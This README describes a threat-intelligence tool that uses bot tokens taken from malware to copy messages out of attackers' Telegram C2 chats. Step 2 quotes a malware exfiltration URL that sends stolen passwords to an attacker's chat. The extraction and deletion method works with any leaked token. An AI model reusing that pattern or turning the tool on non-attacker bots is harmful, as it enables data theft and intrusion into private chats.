# Telegram C2 Message Extractor

A security research tool for extracting and analyzing messages from Telegram bots used as covert Command & Control (C2) channels by attackers. When malware authors embed Telegram Bot API tokens in their payloads, this tool enables researchers to intercept, monitor, and disrupt attacker communications using those extracted tokens.

<img width="1100" height="818" alt="image" src="https://github.com/user-attachments/assets/42656d4e-9e3d-4b13-b121-c27459638d2d" />

<figcaption align="center"><b>Figure 1:</b> Messages extracted from XWorm stealer C2 channel.</figcaption>


## Background

Threat actors increasingly abuse the Telegram Bot API as a lightweight C2 infrastructure. Rather than standing up dedicated C2 servers, attackers embed bot tokens directly in malwares. The compromised host communicates with the attacker via the Telegram Bot API - receiving commands, exfiltrating data, and reporting status. This architecture gives attackers free, encrypted, and highly available C2 infrastructure that blends with legitimate Telegram traffic.

**This creates a critical weakness**: the bot token is a shared secret. Once extracted from a malware sample, we can use the same token to:

- **Monitor C2 commands and responses** sent between the attacker and victim machines
- **Recover exfiltrated data** (credentials, screenshots, keystrokes, files, etc.) forwarded through the bot
- **Identify victims** and scope the extent of a campaign
- **Map attacker TTPs** by analyzing command patterns and timing
- **Disrupt operations** - by revoking extracted tokens, severing the attacker’s control.

## Security Research Workflow

### 1. Extract the Bot Token from Malware

Bot tokens are typically embedded as plaintext strings in malware samples. Common locations:

- **Hardcoded in source/bytecode**: Search for the pattern `[0-9]+:[A-Za-z0-9_-]{35}`
- **Obfuscated strings**: Run the sample in a sandbox and monitor HTTP/S requests to `api.telegram.org`
- **Network traffic capture**: Intercept outbound HTTPS to `api.telegram.org/bot<TOKEN>/`
- **Memory forensics**: Dump process memory and grep for the token pattern
- **Supply chain packages**: Inspect malicious PyPI/npm packages for embedded tokens (as in the Checkmarx research)

```bash
# Static extraction from a sample
grep -oP '[0-9]{8,10}:[A-Za-z0-9_-]{35}' malware.exe

# From pcap / network logs
tshark -r capture.pcap -Y 'http.host contains "api.telegram.org"' -T fields -e http.request.uri
```

### 2. Extract the Chat ID from the Malware

The **most reliable method** for identifying the attacker's chat ID is to extract it directly from the malware's hardcoded API calls. Malware authors typically embed both the bot token and the destination `chat_id` in their C2 communication URLs. For example, a typical exfiltration call found in malware source code looks like:

```
https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ATTACKER_CHAT_ID>&caption=PW_<HOSTNAME>_<USERNAME>_<IP>
```

This reveals the attacker's chat ID as a hardcoded parameter - this is the operator's private chat where all stolen data and C2 responses are sent.

> **Why not rely on `getUpdates`?** The `getUpdates` endpoint only returns the most recent unconfirmed messages sent *to* the bot - it does not provide a complete history and will miss the attacker's chat ID entirely if no recent messages exist. The chat ID hardcoded in the malware itself is the authoritative source.

### 3. Validate the Token and Enumerate the Bot

After extracting the token and chat ID, confirm the token is still active and gather additional context:

```bash
# Check if the token is still active
curl -s "https://api.telegram.org/bot<TOKEN>/getMe" | python3 -m json.tool

# Check recent interactions (limited - only shows latest unconfirmed messages to the bot)
curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" | python3 -m json.tool
```

`getUpdates` can be useful as a **supplementary source** - if the bot is actively receiving traffic, it may reveal:
- **Additional victim chat IDs** beyond what's hardcoded in the sample you have
- **Recent C2 commands** the attacker sent to victims
- **Timestamps** of recent activity

However, it only surfaces the last unconfirmed updates and is not a substitute for the chat ID extracted directly from the malware.

### 4. Set Up the Target Chat (Where Forwarded Messages Go)

The `forwardMessage` API call is made using the **attacker's bot token**, which means the target chat - where extracted messages will be forwarded - must be a chat where the attacker's bot is a participant. The bot cannot forward messages to arbitrary chats it has never interacted with.

**Recommended method - start a private chat with the attacker's bot:**

1. Call `getMe` using the extracted token to get the bot's username:
   ```bash
   curl -s "https://api.telegram.org/bot<TOKEN>/getMe" | python3 -m json.tool
   ```
   The response includes a `username` field (e.g., `"username": "malware_c2_bot"`).
   
<img width="1162" height="370" alt="image" src="https://github.com/user-attachments/assets/c9e9f0c3-5291-42ee-bd2c-9f6b4ac23262" />

2. Open Telegram and navigate to `https://t.me/<bot_username>` (e.g., `https://t.me/malware_c2_bot`).

3. Press **Start** or send `/start` to initiate a private chat with the bot. This is required - Telegram bots cannot send messages to users who haven't started a conversation first.

4. Get your chat ID from the bot's perspective by calling `getUpdates` after sending `/start`:
   ```bash
   curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" | python3 -m json.tool
   ```
   Your `/start` message will appear in the response. The `chat.id` field in that update is your **TARGET_CHAT_ID**.

<img width="1197" height="608" alt="image" src="https://github.com/user-attachments/assets/304b7703-f335-4328-9e53-1a8f8cf8eaeb" />

5. Use this chat ID as `TARGET_CHAT_ID` in the extractor config. All forwarded C2 messages will now appear in your private chat with the attacker's bot.

**Alternative method - add the bot to a group you control:**

1. Create a new Telegram group for analysis purposes.
2. Add the attacker's bot to the group (using its username from `getMe`).
3. Send a message in the group, then call `getUpdates` to retrieve the group's chat ID.
4. Use the group chat ID as `TARGET_CHAT_ID`.

This approach is useful if multiple researchers need to view the extracted messages in a shared channel.

> **OPSEC warning**: Starting a chat or adding the attacker's bot to a group generates activity visible in the bot's `getUpdates` feed. If the attacker is actively monitoring their bot, they will see your interaction. Use a disposable Telegram account for this step. Consider first using the Telegram Bot API directly (e.g., `getUpdates` via curl) for passive enumeration before running the extractor, which actively copies messages into the target chat.

### 5. Run the Extractor

**Arguments:**

| Flag | Required | Description | Security Research Context |
|------|----------|-------------|--------------------------|
| `--token` | Yes | Bot token secret (the part **after** the colon) | Token extracted from malware sample |
| `--bot-id` | Yes | Numeric bot user ID (the part **before** the colon) | From the same token string (e.g., `8700194185` from `8700194185:AAE7Rb...`) |
| `--source` | Yes | Source chat ID | Attacker's chat ID extracted from the malware's hardcoded API calls (see Step 2) |
| `--target` | Yes | Target chat ID | Your private chat ID obtained by sending `/start` to the bot (see Step 4) |
| `--start-id` | Yes | Message ID to start from | Also controls how many messages are pulled backward (pulls from `start-id` down to `1`) |
| `--logout` | No | Invalidate the bot session | Invalidates the bot session to disrupt or terminate active C2 control |
| `--delete` | No | Delete the source message after it has been successfully copied | Used only when cleanup or removal of messages is intentionally required after collection |
| `--forward` | No | Number of messages to pull forward (newer than `start-id`) | Use to capture messages posted after your starting point |
| `--delay` | No | Seconds between API calls (default: `0.34`) | Increase if hitting rate limits during large extractions |
| `--out` | No | Output JSON file (default: `pull_results.json`) | Path for the results archive |

**Example - extract the first 500 messages from an attacker's C2 chat:**

```bash
python TeleHound.py \
    --token "AAE3aXIAPdsMRSfPUi0USKh_TVVDyGn4YIY" \
    --bot-id "8700193185" \
    --source "8547707202" \
    --target "<YOUR_CHAT_ID>" \
    --start-id 500
```

This pulls messages 500, 499, 498, ..., 1 (backward from `start-id` to 1) and copies each into your target chat.

**Example - pull the first 500 messages and also capture 200 newer messages:**

```bash
python TeleHound.py \
    --token "AAE3aXIAPdsMRSfPUi0USKh_TVVDyGn4YIY" \
    --bot-id "8700193185" \
    --source "8547707202" \
    --target "<YOUR_CHAT_ID>" \
    --start-id 500 \
    --forward 200 \
    --delay 0.5 \
    --out c2_extraction.json
```

This pulls messages 500→1 (backward), then 501→700 (forward), with a 0.5s delay between requests.


**Example - pull the first 20 messages from chat ID 4433221100 and log the bot out:**

```bash
python TeleHound.py \
    --token "ZYXWVUTSRQ0987654321zyxwvutsrqponml" \
    --bot-id "8700193185" \
    --source "4433221100" \
    --target "8733224442" \
    --start-id 20 \
    --logout
```


> **Note**: The script uses `copyMessage` rather than `forwardMessage` - copied messages appear as regular messages in the target chat without a "Forwarded from" header, which keeps the extraction cleaner for analysis.

<img width="1197" height="751" alt="image" src="https://github.com/user-attachments/assets/902095a6-5445-4bce-beaf-30ad1068bef2" />
<figcaption align="center"><b>Figure 2:</b> Messages extracted from a phishing page exfil channel</figcaption>

<img width="1600" height="484" alt="image" src="https://github.com/user-attachments/assets/45e20720-57a8-4c94-b576-ca0448f53cc4" />
<figcaption align="center"><b>Figure 3:</b> Messages extracted from a bot that uses a webhook for messages transfer, showing webhook information</figcaption>

## Requirements

```bash
pip install requests
```

## Operational Considerations

### OPSEC for Researchers

- **Use a dedicated research bot account** - do not reuse personal Telegram accounts
- **Enumerate passively first** - use `getUpdates` and `getMe` via curl before running the extractor.
- **Be aware of counter-forensics** - sophisticated actors may detect token reuse and burn the channel 
- **Preserve chain of custody** - hash all output files and document your methodology for potential legal proceedings
- **Guard against "counter-strikes"** - attackers often plant "poisoned" files (like ZIPs containing infostealers) in the C2 chat to infect researchers who try to recover exfiltrated data.

### Limitations

1. **Bot API history restrictions**: Bots cannot fetch arbitrary historical messages directly. The tool works by attempting to forward specific message IDs, which is effective for sweeping through C2 traffic.
2. **Token may be revoked**: Attackers can regenerate tokens via BotFather, killing access. Extract and archive quickly.
3. **Rate limits**: Telegram enforces rate limits. The script includes a 0.5s delay between requests. Increase for large extractions.
4. **Encrypted or encoded payloads**: Some malware encrypts C2 traffic before sending via Telegram. Extracted messages may require additional decoding.
5. **Multiple bots**: Sophisticated campaigns may use multiple bots or rotate tokens. Check the malware for all embedded tokens.

## Chat ID Reference

- **Private chats (victim DMs)**: Positive number (e.g., `123456789`)
- **Groups (operator groups)**: Negative number (e.g., `-987654321`)
- **Supergroups/Channels (exfil channels)**: Large negative number (e.g., `-1001234567890`)

## Troubleshooting

| Error | Cause | Action |
|-------|-------|--------|
| `"Unauthorized"` | Token revoked or invalid | Attacker may have regenerated the token - re-extract from a fresh sample |
| `"Chat not found"` | Bot removed from chat | The attacker may have detected infiltration and cleaned up |
| `"Forbidden"` | Insufficient permissions | Bot lacks read/forward rights in the target chat |
| `"Message not found"` | Message deleted | Attacker is deleting C2 traffic - work faster or use real-time monitoring |
| `"Too Many Requests"` | Rate limited | Increase delay between requests; Telegram returns `retry_after` value |

Results are saved to the output JSON file (default: `pull_results.json`). Each entry has a `status` of `ok`, `skip` (message doesn't exist or was deleted), or `fail` (rate limit retry failed).

## References

- [Checkmarx: How We Were Able to Infiltrate Attacker Telegram Bots](https://checkmarx.com/blog/how-we-were-able-to-infiltrate-attacker-telegram-bots/)
- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [MITRE ATT&CK T1102 - Web Service (C2 via legitimate services)](https://attack.mitre.org/techniques/T1102/)
- [MITRE ATT&CK T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [SafeBreach: Prince of Persia - Attackers try to infect Researchers Machines](https://www.safebreach.com/blog/prince-of-persia-part-ii/)
